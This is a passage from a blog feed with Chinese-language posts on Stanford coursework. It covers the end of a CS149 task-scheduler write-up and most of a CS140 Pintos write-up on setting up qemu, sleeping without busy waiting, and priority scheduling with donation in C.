class="line">   <span class="keyword">while</span> (!taskGroupQueue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">      nowTaskGroup = taskGroupQueue.<span class="built_in">top</span>();</span><br><span class="line">      <span class="keyword">if</span> (!nowTaskGroup-&gt;depending.<span class="built_in">empty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">      queueMutex.<span class="built_in">lock</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nowTaskGroup-&gt;numTotalTasks; i++) &#123;</span><br><span class="line">         nowRunnableTask = <span class="keyword">new</span> <span class="built_in">RunnableTask</span>(nowTaskGroup, i);</span><br><span class="line">         taskQueue.<span class="built_in">push</span>(nowRunnableTask);</span><br><span class="line">      &#125;</span><br><span class="line">      queueMutex.<span class="built_in">unlock</span>();</span><br><span class="line">      queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">      taskGroupQueue.<span class="built_in">pop</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(counterLock)</span></span>;</span><br><span class="line">      counterCond.<span class="built_in">wait</span>(lock, [] &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;);</span><br><span class="line">      finishFlag = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> taskGroup: taskGroupSet) &#123;</span><br><span class="line">         <span class="keyword">if</span> (taskGroup-&gt;taskRemained &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            finishFlag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (finishFlag) <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要任务组队列不为空，就循环检查队首元素是否已经不依赖任何其他任务组，如果是，就循环生成<code>numTotalTasks</code>个<code>RunnableTask</code>，互斥地放入任务队列中去执行。同样的，每放入一组任务，都唤醒等待的工作线程去获取任务。</p><p>每次有任务组完成，都会发送<code>counterCond</code>信号，<code>sync()</code>中等待此信号。收到信号后，如果所有任务组都已经完成，就返回函数。</p><h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><img src="https://img.lfalive.top/CS149-asst2/resultb1.png" style="zoom:50%;" /><img src="https://img.lfalive.top/CS149-asst2/resultb2.png" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> concurrency </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
            <tag> stanford </tag>
            
            <tag> thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS140 - Pintos Projects</title>
      <link href="/2022/01/19/CS140-project/"/>
      <url>/2022/01/19/CS140-project/</url>
      
        <content type="html"><![CDATA[<h1 id="课程链接"><a href="#课程链接" class="headerlink" title="课程链接"></a>课程链接</h1><p><a href="https://web.stanford.edu/~ouster/cgi-bin/cs140-spring20/pintosProjects.php">https://web.stanford.edu/~ouster/cgi-bin/cs140-spring20/pintosProjects.php</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/laiy/p/pintos_project1_thread.html">https://www.cnblogs.com/laiy/p/pintos_project1_thread.html</a></p><p><a href="https://blog.csdn.net/weixin_43752953/article/details/90248966">https://blog.csdn.net/weixin_43752953/article/details/90248966</a></p><p><a href="https://blog.csdn.net/weixin_41680909/article/details/91440122">https://blog.csdn.net/weixin_41680909/article/details/91440122</a></p><p><a href="https://github.com/lfalive/Pintos">我的源码</a></p><h1 id="bochs-pintos"><a href="#bochs-pintos" class="headerlink" title="bochs+pintos"></a>bochs+pintos</h1><p>到<a href="http://bochs.sourceforge.net/">bochs下载地址</a>下载对应版本后，解压，配置，编译，安装。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://udomain.dl.sourceforge.net/project/bochs/bochs/2.7/bochs-2.7.tar.gz</span><br><span class="line">tar -zxvf bochs-2.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bochs-2.7</span><br><span class="line">sudo ./configure --enable-gdb-stub --with-x --with-x11 --with-term --with-nogui</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bochsrc:197: cpu directive malformed.</span><br></pre></td></tr></table></figure><p>打开.bochsrc配置文件，根据行号找到对应错误处。<code>bochs -help cpu</code> 将显示出所有支持的CPU类型。将.bochsrc文件中<code>cpu:model=core2+penryn_t9600</code>的值为上一条查到的所支持的CPU类型之一。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bochsrc:956: Bochs is not compiled with lowlevel sound support</span><br></pre></td></tr></table></figure><p>打开.bochsrc配置文件，注释掉文件中的<code>sound: driver=default, waveout=/dev/dsp. wavein=, midiout=</code>语句。同理，可以注释掉下面的speaker相关配置语句。</p><h2 id="安装pintos"><a href="#安装pintos" class="headerlink" title="安装pintos"></a>安装pintos</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://web.stanford.edu/class/cs140/projects/pintos/pintos.tar.gz</span><br><span class="line">tar -zxvf pintos.tar.gz</span><br></pre></td></tr></table></figure><p>遇到权限问题，bochs也各种莫名报错，改bochs为qemu后也疯狂报错。如<code>MoTTY X11 proxy: Unsupported authorisation protocol</code>等。应该是和图形界面相关的什么错。</p><p>改Ubuntu虚拟机再从头试试。</p><h1 id="qemu-pintos"><a href="#qemu-pintos" class="headerlink" title="qemu+pintos"></a>qemu+pintos</h1><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stackoverflow.com/questions/60696354/cloning-pintos-with-ubuntu">https://stackoverflow.com/questions/60696354/cloning-pintos-with-ubuntu</a></p><p><a href="https://blog.csdn.net/geeeeeker/article/details/108104466">https://blog.csdn.net/geeeeeker/article/details/108104466</a></p><p><a href="https://github.com/kumardeepakr3/PINTOS-Ubuntu">https://github.com/kumardeepakr3/PINTOS-Ubuntu</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>安装好虚拟机和必须的gcc和g++等，就可以正式开始安装pintos。</p><p>首先安装qemu作为模拟器。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-system-x86</span><br></pre></td></tr></table></figure><p>然后从<a href="https://pintos-os.org/cgi-bin/gitweb.cgi?p=pintos-anon;a=summary">pintos官方库</a>中获取最新的pintos，可以避免一些莫名的bug。这一步当然需要先安装git。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://pintos-os.org/pintos-anon pintos</span><br></pre></td></tr></table></figure><p>然后编辑<code>./pintos/src/utils/pintos-gdb</code>，将<code>GDBMACROS</code>改为系统中对应路径。xxx为示例用户名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GDBMACROS=/home/xxx/pintos/src/misc/gdb-macros</span><br></pre></td></tr></table></figure><p>这时候在utils文件夹中make，会报错找不到<code>stropts.h</code>。很多人也遇到了这个问题，可能是Ubuntu系统版本的问题，参考中所使用的18.04没有出现该问题。只有一个文件中的几行代码会用到这个库，先注释掉这部分继续编译，后续有问题的话再考虑重新安装Ubuntu18.04。</p><p>然后编辑<code>/pintos/src/threads/Make.vars</code>，在第7行左右更改模拟器bochs为qemu。再在<code>/src/threads</code>中make编译线程目录。</p><p>紧接着编辑<code>/pintos/src/utils/pintos</code>：</p><ul><li>103行左右：替换bochs为qemu</li><li>621行左右：替换模拟器命令为qemu-system-x86_64</li><li>257行左右：替换kernel.bin为完整路径的kernel.bin（threads目录中的kernel.bin）</li><li>362行左右：替换$loader_fn变量为完整路径的loader.bin（threads目录中的loader.bin）</li></ul><p>编辑<code>~/.bashrc</code>，将<code>/pintos/src/utils</code>添加到PATH，即添加如下命令到最后一行。再重新打开终端运行<code>source ~/.bashrc</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/.../pintos/src/utils:$PATH</span><br></pre></td></tr></table></figure><p>最后在终端输入pintos run alarm-multiple测试，显示如下。</p><img src="https://img.lfalive.top/CS140-project/1.png" style="zoom:80%;" /><h1 id="Alarm-Clock"><a href="#Alarm-Clock" class="headerlink" title="Alarm Clock"></a>Alarm Clock</h1><p>Reimplement <code>timer_sleep()</code>, defined in <code>devices/timer.c</code>. Although a working implementation is provided, it “busy waits,” that is, it spins in a loop checking the current time and calling <code>thread_yield()</code> until enough time has gone by. Reimplement it to avoid busy waiting.</p><ul><li><p>Function: void <strong>timer_sleep</strong> (int64_t ticks)</p><p>Suspends execution of the calling thread until time has advanced by at least x timer ticks. Unless the system is otherwise idle, the thread need not wake up after exactly x ticks. Just put it on the ready queue after they have waited for the right amount of time.<code>timer_sleep()</code> is useful for threads that operate in real-time, e.g. for blinking the cursor once per second.The argument to <code>timer_sleep()</code> is expressed in timer ticks, not in milliseconds or any another unit. There are <code>TIMER_FREQ</code> timer ticks per second, where <code>TIMER_FREQ</code> is a macro defined in <code>devices/timer.h</code>. The default value is 100. We don’t recommend changing this value, because any change is likely to cause many of the tests to fail.</p></li></ul><p>Separate functions <code>timer_msleep()</code>, <code>timer_usleep()</code>, and <code>timer_nsleep()</code> do exist for sleeping a specific number of milliseconds, microseconds, or nanoseconds, respectively, but these will call <code>timer_sleep()</code> automatically when necessary. You do not need to modify them.</p><p>If your delays seem too short or too long, reread the explanation of the -r option to <code>pintos</code> (see section <a href="https://web.stanford.edu/~ouster/cgi-bin/cs140-spring20/pintos/pintos_1.html#SEC6">1.1.4 Debugging versus Testing</a>).</p><h2 id="review"><a href="#review" class="headerlink" title="review"></a>review</h2><p>主要看<code>devices/timer.c</code>、<code>threads/interrupt.c</code>和<code>threads/thread.c</code>这几个文件。</p><p><code>timer_sleep</code>中，<code>timer_ticks</code>函数获取ticks的当前值返回。<code>intr_get_level</code>返回了<code>intr_level</code>的值。</p><p><code>timer_ticks</code>: Returns the number of timer ticks since the OS booted。从pintos被启动开始，ticks就一直在计时。其中中断相关的语句只是确保这个过程不能被中断，即保持这个操作的原子性。</p><p><code>intr_disable</code>获取了当前的中断状态，然后将当前中断状态改为不能被中断，然后返回执行之前的中断状态。</p><p><code>ASSERT (!intr_context ());</code>断言了intr_context函数返回结果的false，即断言这个中断不是外中断（IO等，也称为硬中断），而是操作系统正常线程切换流程里的内中断（也称为软中断）。</p><p><code>thread_schedule_tail</code>获取当前线程，分配恢复之前执行的状态和现场，如果当前线程死了就清空资源。</p><p><code>thread_yield</code>把当前线程扔到就绪队列里，然后重新schedule。</p><p>总结：<code>timer_sleep</code>就是在ticks时间内，如果线程处于running状态就不断把他扔到就绪队列不让他执行。缺点是线程依然不断在cpu就绪队列和running队列之间来回，占用了cpu资源，我们希望用一种唤醒机制来实现这个函数。</p><p>实现思路：调用<code>timer_sleep</code>的时候直接把线程block掉，然后在线程结构体中加一个成员ticks_blocked，用于记录线程被sleep了多久。再利用操作系统自身的，每个tick会执行一次的，时钟中断来检测线程状态。每个tick将ticks_blocked减，如果减到0就表示该线程结束sleep，唤醒这个线程。</p><h2 id="devices-x2F-timer-c"><a href="#devices-x2F-timer-c" class="headerlink" title="devices&#x2F;timer.c"></a>devices&#x2F;timer.c</h2><p><img src="https://img.lfalive.top/CS140-project/2.png"></p><p>使用old_level保存和恢复中断情况，保证中间操作的原子性。获取当前线程后，设置该线程的ticks_blocked值，并调用thread_block()。</p><p><img src="https://img.lfalive.top/CS140-project/3.png"></p><p>对于系统自身的中断程序，每个tick的时候对每个线程都执行一次blocked_thread_check（借助foreach函数）。</p><h2 id="threads-x2F-thread-h"><a href="#threads-x2F-thread-h" class="headerlink" title="threads&#x2F;thread.h"></a>threads&#x2F;thread.h</h2><p>在thread中加入ticks_blocked成员。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int64_t</span> ticks_blocked; <span class="comment">/* Record the time the thread has been blocked. */</span></span><br></pre></td></tr></table></figure><p>声明上文提到的blocked_thread_check函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">blocked_thread_check</span> <span class="params">(<span class="keyword">struct</span> thread *t, <span class="type">void</span> *aux UNUSED)</span>;</span><br></pre></td></tr></table></figure><h2 id="threads-x2F-thread-c"><a href="#threads-x2F-thread-c" class="headerlink" title="threads&#x2F;thread.c"></a>threads&#x2F;thread.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check the blocked thread */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">blocked_thread_check</span> <span class="params">(<span class="keyword">struct</span> thread *t, <span class="type">void</span> *aux UNUSED)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (t-&gt;status == THREAD_BLOCKED &amp;&amp; t-&gt;ticks_blocked &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      t-&gt;ticks_blocked--;</span><br><span class="line">      <span class="keyword">if</span> (t-&gt;ticks_blocked == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          thread_unblock(t);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查是否应该唤醒当前线程。如果该线程状态为Blocked且ticks_blocke值不为0，就将其ticks_blocked递减，如果递减后为0，说明已经sleep到了设定时间，立即将其唤醒。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在threads目录中执行<code>make check</code>可以执行所有测试。</p><img src="https://img.lfalive.top/CS140-project/result1.png" style="zoom:50%;" /><h1 id="Priority-Scheduling"><a href="#Priority-Scheduling" class="headerlink" title="Priority Scheduling"></a>Priority Scheduling</h1><p>Implement priority scheduling in Pintos. When a thread is added to the ready list that has a higher priority than the currently running thread, the current thread should immediately yield the processor to the new thread. Similarly, when threads are waiting for a lock, semaphore, or condition variable, the highest priority waiting thread should be awakened first. A thread may raise or lower its own priority at any time, but lowering its priority such that it no longer has the highest priority must cause it to immediately yield the CPU.</p><p>Thread priorities range from <code>PRI_MIN</code> (0) to <code>PRI_MAX</code> (63). Lower numbers correspond to lower priorities, so that priority 0 is the lowest priority and priority 63 is the highest. The initial thread priority is passed as an argument to <code>thread_create()</code>. If there’s no reason to choose another priority, use <code>PRI_DEFAULT</code> (31). The <code>PRI_</code> macros are defined in <code>threads/thread.h</code>, and you should not change their values.</p><p>One issue with priority scheduling is “priority inversion”. Consider high, medium, and low priority threads H, M, and L, respectively. If H needs to wait for L (for instance, for a lock held by L), and M is on the ready list, then H will never get the CPU because the low priority thread will not get any CPU time. A partial fix for this problem is for H to “donate” its priority to L while L is holding the lock, then recall the donation once L releases (and thus H acquires) the lock.</p><p>Implement priority donation. You will need to account for all different situations in which priority donation is required. Be sure to handle multiple donations, in which multiple priorities are donated to a single thread. You must also handle nested donation: if H is waiting on a lock that M holds and M is waiting on a lock that L holds, then both M and L should be boosted to H’s priority. If necessary, you may impose a reasonable limit on depth of nested priority donation, such as 8 levels.</p><p>You must implement priority donation for locks. You need not implement priority donation for the other Pintos synchronization constructs. You do need to implement priority scheduling in all cases.</p><p>Finally, implement the following functions that allow a thread to examine and modify its own priority. Skeletons for these functions are provided in <code>threads/thread.c</code>.</p><ul><li><p>Function: void <strong>thread_set_priority</strong> (int new_priority)</p><p>Sets the current thread’s priority to new_priority. If the current thread no longer has the highest priority, yields.</p></li><li><p>Function: int <strong>thread_get_priority</strong> (void)</p><p>Returns the current thread’s priority. In the presence of priority donation, returns the higher (donated) priority.</p></li></ul><p>You need not provide any interface to allow a thread to directly modify other threads’ priorities.</p><h2 id="review-1"><a href="#review-1" class="headerlink" title="review"></a>review</h2><p>线程结构体本身就有一个priority，其取值范围被限定为[0, 63]，默认值是31。维护就绪队列为一个优先队列可以实现优先级调度。查看源码可以发现<code>thread_unblock</code>、<code>thread_yield</code>函数中有将线程放入ready_list的操作。</p><p>查看<code>lib/kernel/list.h</code>文件，发现提供了可以用来维护有序队列的函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Operations on lists with ordered elements. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">list_sort</span> <span class="params">(<span class="keyword">struct</span> <span class="built_in">list</span> *,</span></span><br><span class="line"><span class="params">                list_less_func *, <span class="type">void</span> *aux)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">list_insert_ordered</span> <span class="params">(<span class="keyword">struct</span> <span class="built_in">list</span> *, <span class="keyword">struct</span> list_elem *,</span></span><br><span class="line"><span class="params">                          list_less_func *, <span class="type">void</span> *aux)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">list_unique</span> <span class="params">(<span class="keyword">struct</span> <span class="built_in">list</span> *, <span class="keyword">struct</span> <span class="built_in">list</span> *duplicates,</span></span><br><span class="line"><span class="params">                  list_less_func *, <span class="type">void</span> *aux)</span>;</span><br></pre></td></tr></table></figure><h2 id="pass-alarm-priority"><a href="#pass-alarm-priority" class="headerlink" title="pass alarm-priority"></a>pass alarm-priority</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// list_push_back (&amp;ready_list, &amp;t-&gt;elem);</span></span><br><span class="line">list_insert_ordered (&amp;ready_list, &amp;t-&gt;elem, (list_less_func *) &amp;thread_cmp_priority, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>将两处<code>list_push_back</code>改写为<code>list_insert_ordered</code>即可。比较函数<code>thread_cmp_priority</code>是自定义的，把优先级数值大的，即优先级大的线程放前面。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* priority compare function. */</span></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">thread_cmp_priority</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> list_elem *a, <span class="type">const</span> <span class="keyword">struct</span> list_elem *b)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> list_entry(a, <span class="keyword">struct</span> thread, elem)-&gt;priority &gt; list_entry(b, <span class="keyword">struct</span> thread, elem)-&gt;priority;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>list_entry(LIST_ELEM, STRUCT, MEMBER)</code>定义为<code>((STRUCT *) ((uint8_t *) &amp;(LIST_ELEM)-&gt;next - offsetof (STRUCT, MEMBER.next)))</code>，即将指向list元素list_ELEM的指针转换为指向嵌入list_ELEM的结构体的指针。</p><p>这样就通过了alarm-priority测试。</p><h2 id="pass-priority-change"><a href="#pass-priority-change" class="headerlink" title="pass priority-change"></a>pass priority-change</h2><p>在某些时候调用<code>thread_yield</code>即可，即把当前线程丢到ready_list中，重新<code>schedule</code>，保证执行顺序。</p><ul><li>在<code>thread_create</code>中创建线程的时候， 如果新线程比当前线程优先级高的话，调用<code>thread_yield</code>。</li><li>在设置任意一个线程优先级时，调用<code>thread_yield</code>，立即重新考虑所有线程执行顺序。</li></ul><img src="https://img.lfalive.top/CS140-project/create_pri.png" style="zoom:50%;" /><h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><p>同时通过了priority_preempt和priority_fifo。</p><img src="https://img.lfalive.top/CS140-project/result2.png" style="zoom:50%;" /><h2 id="review-remaining-tests"><a href="#review-remaining-tests" class="headerlink" title="review remaining tests"></a>review remaining tests</h2><p><strong>优先级捐赠：</strong>当发现高优先级的任务因为低优先级任务占用资源而阻塞时，就将低优先级任务的优先级提升到等待它所占有的资源的最高优先级任务的优先级。</p><p>由priority-donate-one测试代码可知，在一个线程获取一个锁的时候，如果拥有这个锁的线程优先级比自己低就提高它的优先级，然后在这个线程释放掉这个锁之后把原来拥有这个锁的线程改回原来的优先级。</p><p>priority-donate-multiple和priority-donate-multiple2是测试多锁情况下优先级逻辑的正确性。释放一个锁的时候，将该锁的拥有者改为该线程被捐赠的第二优先级，若没有其余捐赠者，则恢复原始优先级。那么线程必然需要一个数据结构来记录所有对这个线程有捐赠行为的线程。</p><p>priority-donate-nest是一个优先级嵌套问题，重点在于medium请求的锁被low占有，在这个前提下high再去获取medium已拥有的锁，这种情况的优先级提升具有连环效应，就是medium被提升了，此时low线程应该跟着一起提升。需要加一个数据结构，需要获取这个线程请求的锁被哪些线程占有。</p><p>priority-donate-sema包含了信号量和锁混合触发，实际上还是信号量在起作用，因为锁是由信号量实现的。</p><p>priority-donate-lower测试的逻辑是当修改一个被捐赠的线程优先级的时候的行为正确性。</p><p>priority-sema中，信号量V唤醒线程的时候也是先唤醒优先级高的。换句话说，信号量的等待队列是个优先级队列。</p><p>priority-condvar同理，condition的waiters队列是个优先级队列。</p><p>priority-donate-chain是一个链式优先级捐赠，本质测试的还是多层优先级捐赠逻辑的正确性。需要注意的是一个逻辑：释放掉一个锁之后，如果当前线程不被捐赠即马上改为原来的优先级，抢占式调度。</p><p>逻辑总结为：</p><ol><li><p>一个线程获取一个锁的时候，如果拥有这个锁的线程优先级比自己低，就提高它的优先级，即捐赠优先级。如果这个锁还被别的锁锁着，就递归捐赠优先级，在这个线程释放掉这个锁之后恢复未捐赠逻辑下的优先级。</p></li><li><p>如果一个线程被多个线程捐赠，将当前的优先级设定为捐赠优先级中的最大值。</p></li><li><p>在对一个线程进行优先级设置的时候，如果这个线程处于被捐赠状态，则对base_priority进行设置。如果设置的优先级大于当前优先级，则改变当前优先级，否则在捐赠状态取消的时候恢复base_priority。</p></li><li><p>在释放锁对一个锁优先级有改变的时候，应考虑其余被捐赠优先级和当前优先级，优先级嵌套的问题。</p></li><li><p>将信号量的waiters队列和condition的waiters队列实现为优先级队列。</p></li><li><p>释放锁的时候，若优先级改变，可以发生抢占。</p></li></ol><h2 id="synch-c"><a href="#synch-c" class="headerlink" title="synch.c"></a>synch.c</h2><p>在synch.h中的lock结构体中加入成员： </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_elem</span> <span class="title">elem</span>;</span>      <span class="comment">/* List element for priority donation. */</span></span><br><span class="line"><span class="type">int</span> max_priority;     <span class="comment">/* Max priority among the threads acquiring the lock. */</span></span><br></pre></td></tr></table></figure><h3 id="锁的获取和释放"><a href="#锁的获取和释放" class="headerlink" title="锁的获取和释放"></a>锁的获取和释放</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">lock_acquire</span> <span class="params">(<span class="keyword">struct</span> lock *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (lock != <span class="literal">NULL</span>);</span><br><span class="line">  ASSERT (!intr_context ());</span><br><span class="line">  ASSERT (!lock_held_by_current_thread (lock));</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">cur</span> =</span> thread_current ();</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">lock</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 锁目前被某个线程占有</span></span><br><span class="line">  <span class="keyword">if</span> (lock-&gt;holder != <span class="literal">NULL</span> &amp;&amp; !thread_mlfqs)</span><br><span class="line">  &#123;</span><br><span class="line">    cur-&gt;lock_waiting = lock;</span><br><span class="line">    tmp = lock;</span><br><span class="line">    <span class="keyword">while</span> (tmp &amp;&amp; cur-&gt;priority &gt; tmp-&gt;max_priority)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp-&gt;max_priority = cur-&gt;priority; <span class="comment">// 提高锁的优先级</span></span><br><span class="line">      thread_donate_priority (tmp-&gt;holder); <span class="comment">// 捐赠优先级给锁的持有线程</span></span><br><span class="line">      tmp = tmp-&gt;holder-&gt;lock_waiting; <span class="comment">//递归处理</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sema_down (&amp;lock-&gt;semaphore);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">intr_level</span> <span class="title">old_level</span> =</span> intr_disable ();</span><br><span class="line">  cur = thread_current ();</span><br><span class="line">  <span class="keyword">if</span> (!thread_mlfqs)</span><br><span class="line">  &#123;</span><br><span class="line">    cur-&gt;lock_waiting = <span class="literal">NULL</span>; <span class="comment">//现在不再等待任何锁</span></span><br><span class="line">    lock-&gt;max_priority = cur-&gt;priority; <span class="comment">//锁的最大优先级为当前线程的优先级</span></span><br><span class="line">    thread_hold_the_lock (lock); <span class="comment">//该线程占有该锁</span></span><br><span class="line">  &#125;</span><br><span class="line">  lock-&gt;holder = cur;</span><br><span class="line">  intr_set_level (old_level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/CS140-project/4.png"></p><h3 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">lock_cmp_priority</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> list_elem *a, <span class="type">const</span> <span class="keyword">struct</span> list_elem *b, <span class="type">void</span> *aux UNUSED)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> list_entry (a, <span class="keyword">struct</span> lock, elem)-&gt;max_priority &gt; list_entry (b, <span class="keyword">struct</span> lock, elem)-&gt;max_priority;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">cond_sema_cmp_priority</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> list_elem *a, <span class="type">const</span> <span class="keyword">struct</span> list_elem *b, <span class="type">void</span> *aux UNUSED)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">semaphore_elem</span> *<span class="title">sa</span> =</span> list_entry (a, <span class="keyword">struct</span> semaphore_elem, elem);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">semaphore_elem</span> *<span class="title">sb</span> =</span> list_entry (b, <span class="keyword">struct</span> semaphore_elem, elem);</span><br><span class="line">  <span class="keyword">return</span> list_entry(list_front(&amp;sa-&gt;semaphore.waiters), <span class="keyword">struct</span> thread, elem)-&gt;priority &gt; list_entry(list_front(&amp;sb-&gt;semaphore.waiters), <span class="keyword">struct</span> thread, elem)-&gt;priority;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号量相关"><a href="#信号量相关" class="headerlink" title="信号量相关"></a>信号量相关</h3><p><img src="https://img.lfalive.top/CS140-project/5.png"></p><p><img src="https://img.lfalive.top/CS140-project/6.png"></p><h3 id="condition-variable相关"><a href="#condition-variable相关" class="headerlink" title="condition_variable相关"></a>condition_variable相关</h3><p><img src="https://img.lfalive.top/CS140-project/7.png"></p><h2 id="thread-c"><a href="#thread-c" class="headerlink" title="thread.c"></a>thread.c</h2><p>在thread结构体中加入如下成员:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> base_priority;               <span class="comment">/* Base priority. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list</span> <span class="title">locks</span>;</span>               <span class="comment">/* Locks that the thread is holding. */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span> *<span class="title">lock_waiting</span>;</span>      <span class="comment">/* The lock that the thread is waiting for. */</span></span><br></pre></td></tr></table></figure><p>在<code>init_thread</code>中加入如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t-&gt;base_priority = priority;</span><br><span class="line">list_init (&amp;t-&gt;locks);</span><br><span class="line">t-&gt;lock_waiting = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="thread-set-priority"><a href="#thread-set-priority" class="headerlink" title="thread_set_priority"></a>thread_set_priority</h3><p><img src="https://img.lfalive.top/CS140-project/8.png"></p><h3 id="thread-donate-priority"><a href="#thread-donate-priority" class="headerlink" title="thread_donate_priority"></a>thread_donate_priority</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Donate current priority to thread t. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_donate_priority</span> <span class="params">(<span class="keyword">struct</span> thread *t)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">intr_level</span> <span class="title">old_level</span> =</span> intr_disable ();</span><br><span class="line">  thread_update_priority (t);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//更新ready_list队列</span></span><br><span class="line">  <span class="keyword">if</span> (t-&gt;status == THREAD_READY)</span><br><span class="line">  &#123;</span><br><span class="line">    list_remove (&amp;t-&gt;elem);</span><br><span class="line">    list_insert_ordered (&amp;ready_list, &amp;t-&gt;elem, thread_cmp_priority, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  intr_set_level (old_level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="thread-hold-the-lock"><a href="#thread-hold-the-lock" class="headerlink" title="thread_hold_the_lock"></a>thread_hold_the_lock</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Let thread hold a lock */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title 